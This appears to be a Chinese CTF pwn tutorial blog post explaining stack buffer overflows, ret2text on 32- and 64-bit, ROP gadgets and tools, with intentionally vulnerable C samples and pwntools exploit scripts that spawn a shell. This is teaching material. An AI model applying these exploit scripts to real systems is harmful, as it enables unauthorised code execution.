<h3 id="how-to-understand-stack-buffer-overflow？"><a href="#how-to-understand-stack-buffer-overflow？" class="headerlink" title="how to understand stack buffer overflow？"></a>how to understand stack buffer overflow？</h3><p>在学习计算机系统的过程中，我们可以学习到<strong>栈帧</strong>的结构：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+---------------------+</span><br><span class="line">| 返回地址 (ret)       | ← 被溢出数据覆盖</span><br><span class="line">+---------------------+</span><br><span class="line">| 调用者栈帧基址 (ebp) | ← 可能被覆盖</span><br><span class="line">+---------------------+</span><br><span class="line">| 局部变量 buffer      | ← 溢出起点 [0-7]</span><br><span class="line">| [0] [1] ... [7]      |</span><br><span class="line">+---------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></div>

<p>栈缓冲区溢出发生在向栈上分配的缓冲区写入数据时<strong>超出其边界</strong>，覆盖相邻内存区域</p>
<p>特征是读入数据长度无限制或者读入长度大于缓冲区长度</p>
<h3 id="how-to-solve-a-ret2text-problem"><a href="#how-to-solve-a-ret2text-problem" class="headerlink" title="how to solve a ret2text problem?"></a>how to solve a ret2text problem?</h3><h4 id="32位系统"><a href="#32位系统" class="headerlink" title="32位系统"></a>32位系统</h4><h5 id="无需传参"><a href="#无需传参" class="headerlink" title="无需传参"></a>无需传参</h5><p>如果程序的后门函数参数已经满足 getshell 的需求，那么就可以直接溢出覆盖 ret 地址不用考虑传参问题</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shell[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">    system(shell);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">8</span>]=&#123;&#125;;</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;inputs: &quot;</span>,<span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>以上就是一道很经典的32位系统无传参的ret2text</p>
<p>攻击关键：</p>
<pre><code>1. `**func()**` 已包含 `**system(&quot;/bin/sh&quot;)**`
2. `**read()**` 允许写入超长数据
3. 偏移量计算：
</code></pre>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _DWORD buf[<span class="number">3</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;inputs: &quot;</span>, <span class="number">7u</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>栈帧结构（32位系统）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">低地址</span><br><span class="line">+-----------------+</span><br><span class="line">| buf[0]          |  &lt;- ebp-0x10</span><br><span class="line">| buf[1]          |  &lt;- ebp-0xC</span><br><span class="line">| buf[2]          |  &lt;- ebp-0x8</span><br><span class="line">| 未使用空间       |  &lt;- ebp-0x4 (4字节)</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的ebp        |  &lt;- ebp (4字节)</span><br><span class="line">+-----------------+</span><br><span class="line">| 返回地址         |  &lt;- ebp+0x4 (攻击目标)</span><br><span class="line">+-----------------+</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure></div>

<p><strong>从buf起始位置到返回地址的距离</strong>：</p>
<ul>
<li><code>**buf**</code>起始地址 &#x3D; <code>**ebp - 0x10**</code></li>
<li>返回地址位置 &#x3D; <code>**ebp + 0x4**</code></li>
<li>总偏移 &#x3D; <code>**(0x10 + 0x4)**</code> &#x3D; <strong>20字节</strong></li>
</ul>
<p>脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&#x27;./x86&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x8049186</span> <span class="comment">#获取到的函数地址，可以通过多种方式获得</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span> + p32(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">7</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h5 id="重构传参"><a href="#重构传参" class="headerlink" title="重构传参"></a>重构传参</h5><p>一般并不会直接将”shell &#x3D; ‘&#x2F;bin&#x2F;sh’”这种危险字符串和system函数放在一起。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shell[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(cmd);<span class="comment">//不同处</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> a[<span class="number">8</span>]=&#123;&#125;;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">&quot;inputs: &quot;</span>,<span class="number">7</span>);</span><br><span class="line">	read(<span class="number">0</span>,a,<span class="number">0x100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	dofunc();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>在32位系统中，函数参数通过栈传递：</p>
<ol>
<li>函数返回地址后紧接着是参数</li>
<li>调用约定：参数从右向左压栈</li>
<li><code>**system(cmd)**</code> 需要1个参数（字符串指针）</li>
</ol>
<p>以下是攻击脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&#x27;./x86&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取关键地址</span></span><br><span class="line">func_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]   <span class="comment"># 获取函数地址</span></span><br><span class="line">shell_addr = elf.symbols[<span class="string">&#x27;shell&#x27;</span>] <span class="comment"># 获取字符串地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算偏移 (与之前相同)</span></span><br><span class="line">offset = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset           <span class="comment"># 填充至返回地址</span></span><br><span class="line">payload += p32(func_addr)         <span class="comment"># 覆盖返回地址</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)        <span class="comment"># func的返回地址（随意）</span></span><br><span class="line">payload += p32(shell_addr)        <span class="comment"># 参数1: cmd指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;inputs: &#x27;</span>)        <span class="comment"># 等待提示</span></span><br><span class="line">io.send(payload)                 <span class="comment"># 发送payload</span></span><br><span class="line">io.interactive()                 <span class="comment"># 获取shell</span></span><br></pre></td></tr></table></figure></div>

<p>:::tips<br><strong>为什么要传入func的返回地址：</strong></p>
<ul>
<li><code>**func()**</code> 在结束时必然执行 <code>**ret**</code> 指令</li>
<li><code>**ret**</code> 会从栈顶弹出4字节作为返回地址</li>
<li>如果不提供这个地址，程序会使用栈上的随机数据作为地址→崩溃</li>
</ul>
<p>:::</p>
<h4 id="64位系统"><a href="#64位系统" class="headerlink" title="64位系统"></a>64位系统</h4><p>在64位系统中，函数调用遵循 <strong>System V AMD64 ABI</strong> 调用约定：</p>
<ul>
<li><strong>寄存器传参</strong>：<ul>
<li>前6个参数通过寄存器传递：</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RDI → 第一个参数</span><br><span class="line">RSI → 第二个参数</span><br><span class="line">RDX → 第三个参数</span><br><span class="line">RCX → 第四个参数</span><br><span class="line">R8  → 第五个参数</span><br><span class="line">R9  → 第六个参数</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>栈传递额外参数</strong>：<ul>
<li>第七个及之后的参数通过栈传递</li>
<li>参数从右向左压栈</li>
</ul>
</li>
</ul>
<p><strong>栈帧对齐</strong>：</p>
<pre><code>- 函数调用前需保证栈指针 **16字节对齐**
- `**call**` 指令会压入8字节返回地址 → 调用前栈指针应为 `**8 mod 16**`
</code></pre>
<h5 id="无需传参-1"><a href="#无需传参-1" class="headerlink" title="无需传参"></a>无需传参</h5><p>与32位系统类似，也即本题这样的，需要注意的点在于栈对齐。</p>
<p>当目标函数如 <code>**treasure()**</code> 无需参数时：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span>          <span class="comment"># 覆盖到返回地址</span></span><br><span class="line">payload += p64(ret_gadget)  <span class="comment"># 栈对齐gadget</span></span><br><span class="line">payload += p64(treasure_addr) <span class="comment"># 目标函数地址</span></span><br></pre></td></tr></table></figure></div>

<p><strong>执行流程</strong>：</p>
<ol>
<li><code>**overflow()**</code> 返回 → 弹出 <code>**ret_gadget**</code> 到 RIP</li>
<li>执行 <code>**ret**</code> 指令 → RSP +&#x3D; 8（对齐）</li>
<li>跳转到 <code>**treasure()**</code> → 获得shell</li>
</ol>
<h5 id="重构传参-1"><a href="#重构传参-1" class="headerlink" title="重构传参"></a>重构传参</h5><p>由于64位系统的特殊传参方式，我们需要用到ROP技术来解决</p>
<p>所以我们要把 rdi 的值改为 ‘&#x2F;bin&#x2F;sh’ 的地址。</p>
<p>参数储存在寄存器内，无法直接使用简单的栈溢出修改寄存器内容，这时候我们需要利用 gadget 片段。</p>
<p>现在目的很明确了</p>
<ol>
<li>修改rdi的值（可使用代码pop rdi ; ret）</li>
<li>在栈中放入’bin&#x2F;sh’经由pop提交给rdi</li>
<li>进入func函数内调用system函数</li>
</ol>
<h5 id="攻击脚本示例"><a href="#攻击脚本示例" class="headerlink" title="攻击脚本示例"></a>攻击脚本示例</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载程序</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vulnerable&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取必要地址</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pop_rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">ret_gadget = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造ROP链</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset</span><br><span class="line">payload += p64(ret_gadget)      <span class="comment"># 栈对齐</span></span><br><span class="line">payload += p64(pop_rdi)        <span class="comment"># pop rdi; ret</span></span><br><span class="line">payload += p64(bin_sh_addr)    <span class="comment"># 参数1 -&gt; RDI</span></span><br><span class="line">payload += p64(system_addr)    <span class="comment"># 调用system</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure></div>

<h5 id="ROP链执行流程"><a href="#ROP链执行流程" class="headerlink" title="ROP链执行流程"></a>ROP链执行流程</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+</span><br><span class="line">| ret_gadget      | → 执行ret指令对齐栈</span><br><span class="line">+-----------------+</span><br><span class="line">| pop_rdi         | → 弹出下个值到RDI</span><br><span class="line">+-----------------+</span><br><span class="line">| bin_sh_addr     | → &quot;/bin/sh&quot;地址</span><br><span class="line">+-----------------+</span><br><span class="line">| system_addr     | → 调用system</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure></div>

<h3 id="what-is-gadget"><a href="#what-is-gadget" class="headerlink" title="what is gadget?"></a>what is gadget?</h3><p>Gadget（小工具&#x2F;代码片段）是指在程序已有的可执行代码段中，由若干指令序列组成的短小代码片段，以 <code>**ret**</code> 指令结尾。这些片段可以被攻击者串联使用，实现特定的操作。</p>
<p><strong>常见 Gadget 类型</strong>：</p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>示例</strong></th>
<th><strong>用途</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>寄存器操作</strong></td>
<td><code>**pop rdi; ret**</code></td>
<td>设置寄存器值</td>
</tr>
<tr>
<td><strong>内存操作</strong></td>
<td><code>**mov [rax], rdx; ret**</code></td>
<td>内存写入</td>
</tr>
<tr>
<td><strong>算术运算</strong></td>
<td><code>**add rax, 0x10; ret**</code></td>
<td>地址计算</td>
</tr>
<tr>
<td><strong>系统调用</strong></td>
<td><code>**syscall; ret**</code></td>
<td>执行系统调用</td>
</tr>
<tr>
<td><strong>栈操作</strong></td>
<td><code>**add rsp, 0x20; ret**</code></td>
<td>调整栈指针</td>
</tr>
</tbody></table>
<h3 id="what-is-ROP"><a href="#what-is-ROP" class="headerlink" title="what is ROP?"></a>what is ROP?</h3><p>ROP（Return-Oriented Programming）是一种高级漏洞利用技术，通过串联多个 gadget 地址形成”链式调用”，在存在内存防护机制（NX&#x2F;DEP）的环境下实现任意代码执行。</p>
<p>:::tips<br>工具介绍：<strong>ROPgadget</strong></p>
<p>ROPgadget 用于自动化搜索二进制文件（如 ELF、PE、Mach-O）中的 <strong>gadgets</strong>（短指令序列，以 <code>**ret**</code> 结尾），辅助构造 ROP 链。</p>
<p>命令: <code>ROPgadget --binary ./target --only&quot;pop|ret&quot;   </code><em>搜索所有包含 pop 和 ret 的 gadgets</em></p>
<p>命令: <code>ROPgadget --binary ./target --ropchain  </code><em>生成调用 execve 的 ROP 链</em></p>
<p>:::</p>
<p>:::tips<br>工具介绍：One_gadget</p>
<p>One_gadget 专注于在 <strong>libc 库</strong>中查找直接执行 <code>**execve(&quot;/bin/sh&quot;, NULL, NULL)**</code> 的指令片段（即 <strong>one-gadgets</strong>），避免手动构造多参数传递。</p>
<p>命令： <code>one_gadget /lib/x86_64-linux-gnu/libc.so.6 </code># 查找 libc 中的 one-gadgets</p>
<p>:::</p>
<h3 id="脚本解析-1"><a href="#脚本解析-1" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up context</span></span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  <span class="comment"># For detailed debugging</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        host = <span class="string">&#x27;127.0.0.1&#x27;</span>  <span class="comment"># Replace with actual host</span></span><br><span class="line">        port = <span class="number">41853</span>         <span class="comment"># Replace with actual port</span></span><br><span class="line">        p = remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the address of the treasure function</span></span><br><span class="line">    elf = context.binary </span><br><span class="line">    treasure_addr = elf.sym.treasure  <span class="comment">#获取treasure()地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Find a &#x27;ret&#x27; gadget for stack alignment</span></span><br><span class="line">    rop = ROP(elf)  </span><br><span class="line">    ret_gadget = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>] <span class="comment">#使用ROP功能查询gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate required size (16 padding + 8 ret + 8 treasure = 32 bytes)</span></span><br><span class="line">    payload_size = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send payload size</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;overflow the stack?\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(payload_size).encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build payload with stack alignment</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span>               <span class="comment"># Padding to reach saved rbp</span></span><br><span class="line">    payload += p64(ret_gadget)         <span class="comment"># Stack alignment gadget</span></span><br><span class="line">    payload += p64(treasure_addr)      <span class="comment"># Address of treasure()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send payload</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Get to interactive mode for shell access</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK,I recvieve your byte.and then?\n&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="ez-u64"><a href="#ez-u64" class="headerlink" title="ez_u64"></a>ez_u64</h2><p><strong>IDA分析：</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ya hello! Let&#x27;s play a game.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Guess which number I&#x27;m thinking of.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the hint.&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, &amp;num, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%zu&quot;</span>, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( num != num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong answer!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try pwntools u64?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>checksec分析：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./u64</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   52 Symbols        No    0               2               ./u64</span><br></pre></td></tr></table></figure></div>

<p>题目很简单，只是帮助我们认识一下u64的用法。</p>
